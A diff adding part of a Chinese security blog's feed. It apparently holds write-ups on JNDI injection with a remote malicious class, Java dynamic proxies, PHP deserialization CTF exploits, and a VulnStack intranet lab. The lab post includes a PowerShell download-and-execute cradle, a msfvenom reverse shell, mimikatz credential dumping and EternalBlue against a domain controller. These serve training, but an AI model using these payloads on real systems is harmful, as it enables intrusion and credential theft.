+    public String getName() {
+        return name;
+    }
+
+    public void setName(String name) {
+        this.name = name;
+    }
+
+    public String getPassword() {
+        return password;
+    }
+
+    public void setPassword(String password) {
+        this.password = password;
+    }
+
+    public String toString(){
+        return &quot;name:&quot;+name+&quot; password:&quot;+password;
+    }
+}
+</code></pre>
+<p>RMI服务端：</p>
+<pre><code class="language-java">package JavaUnser;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+import javax.naming.spi.NamingManager;
+public class test {
+    public static void initPerson() throws Exception{
+        //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常
+        LocateRegistry.createRegistry(3001);
+        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
+        System.setProperty(Context.PROVIDER_URL, &quot;rmi://localhost:3001&quot;);
+        ////初始化
+        InitialContext ctx = new InitialContext();
+        //实例化person对象
+        Person p = new Person();
+        p.setName(&quot;hello&quot;);
+        p.setPassword(&quot;jndi&quot;);
+        //person对象绑定到JNDI服务中，JNDI的名字叫做：person，即我们可以通过person键值，来对Person对象进行索引
+        ctx.bind(&quot;person&quot;, p);
+        ctx.close();
+
+    }
+    public static void findPerson() throws Exception{
+
+        //因为前面已经将JNDI工厂和JNDI的url和端口已经添加到System对象中，这里就不用在绑定了
+        InitialContext ctx = new InitialContext();
+        //通过lookup查找person对象
+        Person person = (Person) ctx.lookup(&quot;person&quot;);
+        //打印出这个对象
+        System.out.println(person.toString());
+        ctx.close();
+    }
+    public static void main(String[] args) throws Exception {
+        initPerson();
+        findPerson();
+    }
+
+}
+</code></pre>
+<p><img src="https://0xwi11.github.io/post-images/1678595596428.png" alt="" loading="lazy"><br>
+在初始化完上下文context(一组名称和对象绑定组成的键值对)后，此时可以看到defaultinitCtx中已经包含了jndi的环境变量信息，及服务提供者的url和工厂类的信息，也包括了服务器的host地址和已经提供rmi注册表服务的端口<br>
+<img src="https://0xwi11.github.io/post-images/1678595619975.png" alt="" loading="lazy"><br>
+在findperson中，我们直接可以通过初始化context来通过lookup函数，来对rmi服务进行访问，从而获取person对象<br>
+这里我们已经知道可以通过lookup函数来加载远程对象，lookup实际上就要去访问rmi注册表去取回我们想要的对象<br>
+<img src="https://0xwi11.github.io/post-images/1678595651924.png" alt="" loading="lazy"><br>
+<img src="https://0xwi11.github.io/post-images/1678595670220.png" alt="" loading="lazy"></p>
+<p>而getURLOrDefaultInitCtx函数中会根据不同情况来返回ctx，那么如果lookup函数的参数可控，我们可以指定恶意的rmi注册表地址，让客户端加载恶意的对象</p>
+<p>JNDI注入的场景有：<br>
+rmi、通过jndi reference远程调用object方法。<br>
+CORBA IOR 远程获取实现类（Common Object Request Broker Architecture,公共对象请求代理体系结构，通用对象请求代理体系结构   IOR：可互操作对象引用。）<br>
+LDAP 通过序列化对象，JNDI Referene，ldap地址</p>
+<p><strong>JNDI注入例子</strong><br>
+客户端：</p>
+<p>client.java</p>
+<pre><code class="language-java">package JavaUnser;
+import javax.naming.Context;
+import javax.naming.InitialContext;
+public class client {
+    public static void main(String[] args) throws Exception {
+        String uri = &quot;rmi://127.0.0.1:1099/aa&quot;;
+        Context ctx = new InitialContext();
+        ctx.lookup(uri);
+    }
+}
+</code></pre>
+<p>通过初始化context，然后调用lookup函数来访问rmi注册表，尝试调用远程对象</p>
+<p>server.java</p>
+<pre><code class="language-java">package JavaUnser;
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+import javax.naming.Reference;
+import java.rmi.registry.Registry;
+import java.rmi.registry.LocateRegistry;
+public class server {
+    public static void main(String args[]) throws Exception {
+        Registry registry = LocateRegistry.createRegistry(1099);
+        Reference aa = new Reference(&quot;execObj&quot;, &quot;execObj&quot;, &quot;http://127.0.0.1:8081/&quot;);
+        ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa);
+        System.out.println(&quot;Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'&quot;);
+        registry.bind(&quot;aa&quot;, refObjWrapper);
+
+    }
+
+}
+</code></pre>
+<p>此时服务端通过reference将远程对象可以绑定到rmi注册表中，通过reference，可以将远程对象放置在其他服务器上，此时攻击者只要提供恶意的对象供客户端调用即可实现rce</p>
+<p>exec.java</p>
+<pre><code class="language-java">import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
+import java.util.Hashtable;
+public class exec implements ObjectFactory {
+
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception {
+        System.out.println(&quot;sssss&quot;);
+        Runtime.getRuntime().exec(&quot;curl 127.0.0.1:8081&quot;);
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+        return null;
+    }
+}
+</code></pre>
+<p>此时即可以编译exec.java得到exec.class字节码文件，然后将exec.class文件放置在服务器上<br>
+<code>python -m SimpleHTTPServer 8081</code><br>
+本地监听8081端口，这个端口也就是与工厂地址相吻合的<br>
+<img src="https://0xwi11.github.io/post-images/1678595817405.png" alt="" loading="lazy"><br>
+其中factory即为我们想要从http://127.0.0.1:8081请求的class文件的名称，然后启动rmi服务端<br>
+<img src="https://0xwi11.github.io/post-images/1678595856598.png" alt="" loading="lazy"><br>
+此时启动客户端对exec.class文件进行加载，此时成功执行<br>
+<img src="https://0xwi11.github.io/post-images/1678595873245.png" alt="" loading="lazy"><br>
+<img src="https://0xwi11.github.io/post-images/1678595896333.png" alt="" loading="lazy"></p>
+<p>此时成功加载了远程的class文件，并且rce</p>
+<p>总结：<br>
+1、lookup参数可控。<br>
+2、InitialContext类及他的子类的lookup方法允许动态协议转换<br>
+3、lookup查找的对象是Reference类型及其子类<br>
+4、当远程调用类的时候默认会在rmi服务器中的classpath中查找，如果不存在就会去url地址去加载类。如果都加载不到就会失败。</p>
+<p>1.rmi、通过jndi reference远程调用object方法<br>
+2.LDAP 通过序列化对象，JNDI Referene，ldap地址<br>
+3.CORBA IOR 远程获取实现类 (通过iiop协议)</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[java 动态代理]]></title>
+        <id>https://0xwi11.github.io/post/java-dong-tai-dai-li/</id>
+        <link href="https://0xwi11.github.io/post/java-dong-tai-dai-li/">
+        </link>
+        <updated>2021-09-29T04:19:34.000Z</updated>
+        <content type="html"><![CDATA[<p>代理模式是Java中常用的设计模式，主要由公共接口、被代理类和代理类等三部分组成，代理类持有被代理类的实类，代理为执行具体的类方法。其中代理类与被代理类有同样的接口。</p>
+<p>代理类的对象本身并不真正实现服务，而是通过调用被代理类对象的方法来提供特定的服务。</p>
+<p>代理分为静态代理和动态代理，编译时能确定被代理的类就是静态， 在运行过程中确定要被代理的类则是动态代理</p>
+<h2 id="静态代理">静态代理</h2>
+<pre><code class="language-java">public class daili_demo {
+    public static void start(a a){
+        a.echo();
+    }
+    public static void main(String[] args){
+        daili_demo.start(new proxy_subject());
+
+    }
+}
+
+interface a{
+
+    void echo();
+
+}
+
+class real_subject implements a{
+        public void echo(){
+        System.out.println(&quot;real echo&quot;);
+
+    }
+        public static void test(){
+            System.out.println(&quot;test&quot;);
+        }
+}
+
+
+class proxy_subject implements a{
+
+    public void echo(){
+        System.out.println(&quot;start&quot;);
+        new real_subject().echo();
+        new real_subject().test();
+        System.out.println(&quot;end&quot;);
+    }
+}
+
+</code></pre>
+<p>比如上面这段代码实际上proxy_subject和real_subject有相同的接口，proxy_subject即代理类，我们可以在其中调用被代理类的方法，也可以在代理类中实现自己的逻辑，比如在被代理的real_subject的echo调用之前或调用之后添加自己的逻辑</p>
+<h2 id="动态代理">动态代理</h2>
+<p>在Java中java.lang.reflect包下提供了一个Proxy类和一个InvocationHandler接口，通过使用这个类和接口就可以生成动态代理对象。在程序运行过程中产生的这个对象，其实就是通过反射机制来生成的一个代理。</p>
+<p>每一个动态代理类都必须要实现InvocationHandler这个接口<br>
+<strong>InvocationHandler</strong><br>
+<img src="https://0xwi11.github.io/post-images/1678594872048.png" alt="" loading="lazy"><br>
+该接口只有一个方法invoke，动态代理类都必须实现该接口，那么也必须要实现该方法，入口参数Object proxy即为要被代理的对象，method为被调用的方法，args为参数<br>
+<strong>Proxy类</strong><br>
+<img src="https://0xwi11.github.io/post-images/1678594933689.png" alt="" loading="lazy"><br>
+jdk说明中也说了一种简单的方式用于创建动态代理，通过调用Proxy.newProxyInstance函数，proxy类是支持序列化的<br>
+<img src="https://0xwi11.github.io/post-images/1678594948514.png" alt="" loading="lazy"></p>
+<pre><code class="language-java">import java.lang.reflect.Proxy;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Method;
+public class dongtaidaili_demo {
+    public static void main(String[] args){
+            read_object ppp =  new read_object();
+            daili handler = new daili(ppp);
+            b get_b = (b)Proxy.newProxyInstance(ppp.getClass().getClassLoader(),ppp.getClass().getInterfaces(),handler);
+            get_b.fun1();
+    }
+}
+
+interface b{
+  public   void fun1();
+  public   void fun2();
+
+}
+class read_object implements  b{
+
+    public void fun1() {
+        System.out.println(&quot;fun1&quot;);
+    }
+    public void fun2() {
+        System.out.println(&quot;fun2&quot;);
+    }
+
+}
+
+class daili implements InvocationHandler{
+
+    private Object subject;
+    daili(Object subject){
+        this.subject = subject;
+    }
+    public Object invoke(Object object, Method method, Object[] args) throws Throwable {
+        System.out.println(&quot;start&quot;);
+        System.out.println(method);
+        method.invoke(subject,args);
+        System.out.println(&quot;end&quot;);
+        return null;
+
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://0xwi11.github.io/post-images/1678594980630.png" alt="" loading="lazy"></figure>
+<p>JDK会生成一个叫$Proxy0的代理类，这个类文件是放在内存中的，在创建代理类对象时，通过反射机制获得这个类的构造方法，然后创建代理类实例。</p>
+<p>所以整个创建动态代理的流程为首先要声明被代理的接口，然后声明所需要的代理类，然后创建动态代理类，该类要实现invocationhandler接口，然后实现invoke方法，也就是具体的代理处理逻辑，并且要通过该类的构造方法将被代理的对象传进代理类，以便于在invoke函数中进行反射调用。实现代理与被代理的联系是通过newProxyNewinstance，此时要传入classloader，一组接口(就是想要被代理的)，以及动态处理类，那么返回的也是一个接口，这个接口可以是一组接口中的任何一个，通过该接口来调用接口内的方法就能够触发动态代理类内部的invoke函数来实现，classloader是sun.misc.Launcher$AppClassLoader，所以最后可以得到jdk中动态代理实际上就是给接口做的代理</p>
+<figure data-type="image" tabindex="2"><img src="https://0xwi11.github.io/post-images/1678595001635.png" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[CTF] 2021强网杯 WEB部分Write Up]]></title>
+        <id>https://0xwi11.github.io/post/ctf-2021-qiang-wang-bei-web-bu-fen-write-up/</id>
+        <link href="https://0xwi11.github.io/post/ctf-2021-qiang-wang-bei-web-bu-fen-write-up/">
+        </link>
+        <updated>2021-09-22T08:01:28.000Z</updated>
+        <content type="html"><![CDATA[<p>学院实验室的小伙伴想参加强网杯，我就顺带着报了个名，之前学了一点代码审计相关的知识，做了两道代码审计题目。</p>
+<h2 id="强网先锋赌徒">[强网先锋]赌徒</h2>
+<p>源码：</p>
+<pre><code class="language-html">&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;?php
+//hint is in hint.php
+error_reporting(1);
+
+
+class Start
+{
+    public $name='guest';
+    public $flag='syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);';
+	
+    public function __construct(){
+        echo &quot;I think you need /etc/hint . Before this you need to see the source code&quot;;
+    }
+
+    public function _sayhello(){
+        echo $this-&gt;name;
+        return 'ok';
+    }
+
+    public function __wakeup(){
+        echo &quot;hi&quot;;
+        $this-&gt;_sayhello();
+    }
+    public function __get($cc){
+        echo &quot;give you flag : &quot;.$this-&gt;flag;
+        return ;
+    }
+}
+
+class Info
+{
+    private $phonenumber=123123;
+    public $promise='I do';
+	
+    public function __construct(){
+        $this-&gt;promise='I will not !!!!';
+        return $this-&gt;promise;
+    }
+
+    public function __toString(){
+        return $this-&gt;file['filename']-&gt;ffiillee['ffiilleennaammee'];
+    }
+}
+
+class Room
+{
+    public $filename='/flag';
+    public $sth_to_set;
+    public $a='';
+	
+    public function __get($name){
+        $function = $this-&gt;a;
+        return $function();
+    }
+	
+    public function Get_hint($file){
+        $hint=base64_encode(file_get_contents($file));
+        echo $hint;
+        return ;
+    }
+
+    public function __invoke(){
+        $content = $this-&gt;Get_hint($this-&gt;filename);
+        echo $content;
+    }
+}
+
+if(isset($_GET['hello'])){
+    unserialize($_GET['hello']);
+}else{
+    $hi = new  Start();
+}
+
+?&gt;
+</code></pre>
+<p>Room 里可以读取文件并输出，但是需要以调用函数的方式调用这个对象。正好里面的 __get() 方法当调用对象中不存在的属性或者私有的属性的时候就能触发调用他自己。</p>
+<p>再看 Info 对象里的 __toString 就可以调用一个 Room 里不存在的对象 ffiillee['ffiilleennaammee']。</p>
+<p>为了实现输出 Info，看到 Start 里反序列化的时候会调用 _sayhello() 方法。</p>
+<p>于是让 Start-&gt;name 指向 Info，Info-&gt;file['filename'] 指向 Room，然后以调用函数的方式调用 Room，Room-&gt;filename = '/flag' 就能输出 flag 了。</p>
+<p>Exp</p>
+<pre><code class="language-php">class Start
+{
+    public $name;
+}
+class Info{}
+class Room
+{
+    public $filename='/flagxxxxxx';
+}
+$a = new Start();
+$b = new Info();
+$c = new Room();
+$a-&gt;name = $b;
+$b-&gt;file['filename'] = $c;
+$c-&gt;a = $c;
+
+echo urlencode(serialize($a));
+</code></pre>
+<p>优秀学弟的Exp，感觉比我的优雅😂</p>
+<pre><code class="language-php">$a=new Start();
+$a-&gt;name=new Info();
+$a-&gt;name-&gt;file['filename']=new Room();
+$a-&gt;name-&gt;file['filename']-&gt;a=new Room();
+$a-&gt;name-&gt;file['filename']-&gt;a-&gt;filename='php://filter/read=convert.base64-encode/resource=/flag';
+echo(serialize($a));
+</code></pre>
+<h2 id="强网先锋寻宝">[强网先锋]寻宝</h2>
+<p>源代码</p>
+<pre><code class="language-php">&lt;?php
+header('Content-type:text/html;charset=utf-8');
+error_reporting(0);
+highlight_file(__file__);
+function filter($string){
+        $filter_word = array('php','flag','index','KeY1lhv','source','key','eval','echo','\$','\(','\.','num','html','\/','\,','\'','0000000');
+        $filter_phrase= '/'.implode('|',$filter_word).'/';
+        return preg_replace($filter_phrase,'',$string);
+    }
+if($ppp){
+    unset($ppp);
+}
+$ppp['number1'] = &quot;1&quot;;
+$ppp['number2'] = &quot;1&quot;;
+$ppp['nunber3'] = &quot;1&quot;;
+$ppp['number4'] = '1';
+$ppp['number5'] = '1';
+extract($_POST);
+$num1 = filter($ppp['number1']);        
+$num2 = filter($ppp['number2']);        
+$num3 = filter($ppp['number3']);        
+$num4 = filter($ppp['number4']);
+$num5 = filter($ppp['number5']);    
+if(isset($num1) &amp;&amp; is_numeric($num1)){
+    die(&quot;非数字&quot;);
+}
+else{
+  
+    if($num1 &gt; 1024){
+    echo &quot;第一层&quot;;
+        if(isset($num2) &amp;&amp; strlen($num2) &lt;= 4 &amp;&amp; intval($num2 + 1) &gt; 500000){
+            echo &quot;第二层&quot;;
+            if(isset($num3) &amp;&amp; '4bf21cd' === substr(md5($num3),0,7)){
+                echo &quot;第三层&quot;;
+                if(!($num4 &lt; 0)&amp;&amp;($num4 == 0)&amp;&amp;($num4 &lt;= 0)&amp;&amp;(strlen($num4) &gt; 6)&amp;&amp;(strlen($num4) &lt; 8)&amp;&amp;isset($num4) ){
+                    echo &quot;第四层&quot;;
+                    if(!isset($num5)||(strlen($num5)==0)) die(&quot;no&quot;);
+                    $b=json_decode(@$num5);
+                        if($y = $b === NULL){
+                                if($y === true){
+                                    echo &quot;第五层&quot;;
+                                    include 'KeY1lhv.php';
+                                    echo $KEY1;
+                                }
+                        }else{
+                            die(&quot;no&quot;);
+                        }
+                }else{
+                    die(&quot;no&quot;);
+                }
+            }else{
+                die(&quot;no&quot;);
+            }
+        }else{
+            die(&quot;no&quot;);
+        }
+    }else{
+        die(&quot;no111&quot;);
+    }
+}
+</code></pre>
+<p>Exp:<br>
+<code>flag.php?ppp[number1]=10255www&amp;ppp[number2]=99e9&amp;ppp[number4]=0000asa&amp;ppp[number5]=null&amp;ppp[number3]=lET1TUtER7xa2tthOmR6</code><br>
+第一个弱类型比较不多说，第二个科学计数法，第三个爆破脚本在下面加上，第四个同样是弱类型，第五个===优先于赋值。</p>
+<pre><code class="language-python">
+# -*- coding: utf-8 -*-
+
+import multiprocessing
+import hashlib
+import random
+import string
+import sys
+
+
+CHARS = string.letters + string.digits
+
+
+def cmp_md5(substr, stop_event, str_len, start=0, size=20):
+    global CHARS
+
+    while not stop_event.is_set():
+        rnds = ''.join(random.choice(CHARS) for _ in range(size))
+        md5 = hashlib.md5(rnds)
+
+        if md5.hexdigest()[start: start+str_len] == substr:
+            print rnds
+            stop_event.set()
+
+
+if __name__ == '__main__':
+    substr = sys.argv[1].strip()
+
+    start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0
+
+    str_len = len(substr)
+    cpus = multiprocessing.cpu_count()
+    stop_event = multiprocessing.Event()
+    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,
+                                         stop_event, str_len, start_pos))
+                 for i in range(cpus)]
+
+    for p in processes:
+        p.start()
+
+    for p in processes:
+        p.join()
+</code></pre>
+<p>最后还有一道Easy WEB，当时没有做出来，当时是从前台sql注入获取到了管理员账号密码，然后扫目录发现上传点，通过无字母的PHP马子绕过过滤上传Get Shell，web目录下有一个flag文件但是没有权限读取，当时到这里就不知道怎么办了，后面比赛结束看了其他人的write up才知道是通过扫描端口，用jboss完成第二次的RCE提权去读取flag，当时也确实探测到了jboss端口的开放，奈何之前没有学习过jboss，就差一点点/(ㄒoㄒ)/~~。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[内网渗透靶机-VulnStack 1]]></title>
+        <id>https://0xwi11.github.io/post/vulnstack-1/</id>
+        <link href="https://0xwi11.github.io/post/vulnstack-1/">
+        </link>
+        <updated>2021-02-21T13:52:52.000Z</updated>
+        <content type="html"><![CDATA[<p>很久没搞内网了，打个内网渗透靶机试一下。<br>
+靶机下载地址<br>
+http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</p>
+<p>WEB服务器：windows7系统<br>
+<code>外网网卡IP：192.168.92.3</code><br>
+<code>内网网卡IP：192.168.52.143</code></p>
+<p>域成员：windows server 2003系统<br>
+<code>网卡IP:192.168.52.141</code></p>
+<p>域控服务器：windows server 2008系统<br>
+<code>网卡IP：192.168.52.138</code></p>
+<p>攻击机器：kali linux<br>
+<code>kali IP:192.168.92.2</code></p>
+<p>这里放一下之前做的笔记</p>
+<p><strong>信息收集的深度直接关系到内网渗透测试的成败</strong></p>
+<p>在进入内网之后首先要对当前所处的网络环境进行判断。</p>
+<p><strong>我是谁</strong>————当前机器角色的判断（web服务器？生产服务器？</p>
+<p><strong>这是哪</strong>————对当前机器所在网络环境的拓扑结构进行分析和判断</p>
+<p><strong>我在哪</strong>————对当前机器所处区域的判断（DMZ？生产区？办公区？</p>
+<p>在渗透测试中，典型的域权限提升过程，通常是围绕着收集明文凭据或者通过mimikatz提权等方法，在获取了管理员权限的系统中寻找域管理员登录进程，进而收集域管理员的凭据，如果说当前的系统中没有获得域管理员进程，而且当前的账户也不是域管理员账户，那么就只可以看看当前的账户在哪台机器上是管理员，再去另外一台机器试试机会。直到找到可以获取到域管理员的路径。</p>
+<p>所以说我们这次练习的流程应该是，get shell -&gt; 信息收集 -&gt; 提权 -&gt; 拿下域控</p>
+<p>首先我们的目标是get shell。<br>
+既然是同一个网段，那就先arp探测一下主机，发现192.168.92.3的主机<br>
+<img src="https://0xwi11.github.io/post-images/1645453342878.png" alt="" loading="lazy"><br>
+发现80端口开放HTTP服务，同时也可以看到mysql有未授权访问的漏洞。<br>
+<img src="https://0xwi11.github.io/post-images/1645453356328.png" alt="" loading="lazy"><br>
+直接访问IP发现phpstudy探针，发现绝对路径。<br>
+<img src="https://0xwi11.github.io/post-images/1645453360490.png" alt="" loading="lazy"><br>
+访问phpmyadmin，弱口令 root root<br>
+<img src="https://0xwi11.github.io/post-images/1645453425620.png" alt="" loading="lazy"><br>
+查看能不能select into 写shell， secure_file_priv为NULL，表示不能够写入，需要找另外的方法写shell。<br>
+<img src="https://0xwi11.github.io/post-images/1645453430125.png" alt="" loading="lazy"><br>
+尝试日志写SHELL<br>
+<img src="https://0xwi11.github.io/post-images/1645453433648.png" alt="" loading="lazy"><br>
+将日志选项打开<br>
+<img src="https://0xwi11.github.io/post-images/1645453436216.png" alt="" loading="lazy"><br>
+更改日志文件存放的路径，前面绝对路径的知识在这里用上了<br>
+<img src="https://0xwi11.github.io/post-images/1645453438674.png" alt="" loading="lazy"><br>
+直接select一句话木马<br>
+<img src="https://0xwi11.github.io/post-images/1645453442025.png" alt="" loading="lazy"><br>
+用蚁剑连接，可以执行CMD且权限为administrator<br>
+<img src="https://0xwi11.github.io/post-images/1645453445109.png" alt="" loading="lazy"><br>
+打开CS，选择部署反弹shell脚本，监听连接<br>
+<img src="https://0xwi11.github.io/post-images/1645453448191.png" alt="" loading="lazy"><br>
+在被控制的主机上面执行以下命令</p>
+<pre><code>powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring('http://192.168.92.2:8022/wwii'))&quot;
+</code></pre>
+<p><img src="https://0xwi11.github.io/post-images/1645453452731.png" alt="" loading="lazy"><br>
+在CS上面可以看到目标以上线，这是靶场练习所以输入sleep 0修改心跳时间为0s<br>
+<img src="https://0xwi11.github.io/post-images/1645453456574.png" alt="" loading="lazy"><br>
+首先Net View做一下信息收集，查看域内主机<br>
+<img src="https://0xwi11.github.io/post-images/1645453461432.png" alt="" loading="lazy"><br>
+可以看到OWA的类型是PDC（主域控），所以说我们要入侵的目标找到了。<br>
+<img src="https://0xwi11.github.io/post-images/1645453465048.png" alt="" loading="lazy"><br>
+run一个mimikatz，导出密码<br>
+<img src="https://0xwi11.github.io/post-images/1645453470853.png" alt="" loading="lazy"><br>
+有了密码之后使用psexec来控制内网其他主机<br>
+<img src="https://0xwi11.github.io/post-images/1645453474776.png" alt="" loading="lazy"><br>
+选择管理员的账号和密码，点击launch<br>
+<img src="https://0xwi11.github.io/post-images/1645453478757.png" alt="" loading="lazy"><br>
+可以看到域控已上线，到此结束。<br>
+<img src="https://0xwi11.github.io/post-images/1645453482986.png" alt="" loading="lazy"><br>
+<img src="https://0xwi11.github.io/post-images/1645453486539.png" alt="" loading="lazy"><br>
+后面还试了一下使用metasploit来完成渗透。<br>
+从蚁剑可以执行命令开始。<br>
+使用以下命令生成反弹shell木马。</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.92.2 lport=9856 -f exe &gt; shell3.exe
+</code></pre>
+<p><img src="https://0xwi11.github.io/post-images/1645453490832.png" alt="" loading="lazy"><br>
+然后进入msf，开启端口监听请求。</p>
+<pre><code>use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 192.168.92.2
+set lport 9856
+exploit
+</code></pre>
+<p><img src="https://0xwi11.github.io/post-images/1645453495226.png" alt="" loading="lazy"><br>
+使用蚁剑上传木马，并且执行。<br>
+<img src="https://0xwi11.github.io/post-images/1645453498523.png" alt="" loading="lazy"><br>
+看到主机上线<br>
+<img src="https://0xwi11.github.io/post-images/1645453502171.png" alt="" loading="lazy"><br>
+本机信息收集<br>
+<img src="https://0xwi11.github.io/post-images/1645453505523.png" alt="" loading="lazy"><br>
+顺便提一下权。<br>
+导出一下密码</p>
+<pre><code>load kiwi #mimikatz集成到了kiwi模块
+creds_all
+</code></pre>
+<p><img src="https://0xwi11.github.io/post-images/1645453509418.png" alt="" loading="lazy"><br>
+<img src="https://0xwi11.github.io/post-images/1645453512271.png" alt="" loading="lazy"><br>
+将内网路由转发至msf</p>
+<pre><code>run get_local_subnets
+run autoroute -s 192.168.52.0/255.255.255.0
+</code></pre>
+<p><img src="https://0xwi11.github.io/post-images/1645453515547.png" alt="" loading="lazy"><br>
+将session放置于后台。<br>
+然后使用永恒之蓝打域控，可以看到已经获得了域控权限。<br>
+<img src="https://0xwi11.github.io/post-images/1645453519412.png" alt="" loading="lazy"></p>
+<p>参考链接<br>
+https://item.jd.com/12743210.html?cu=true&amp;utm_source=book.douban.com&amp;utm_medium=tuiguang&amp;utm_campaign=t_15055_&amp;utm_term=63c030b66e334ec993ca1b35feeb2722<br>
+https://blog.csdn.net/qq_46527080/article/details/112648202</p>
+]]></content>
+    </entry>
+</feed>
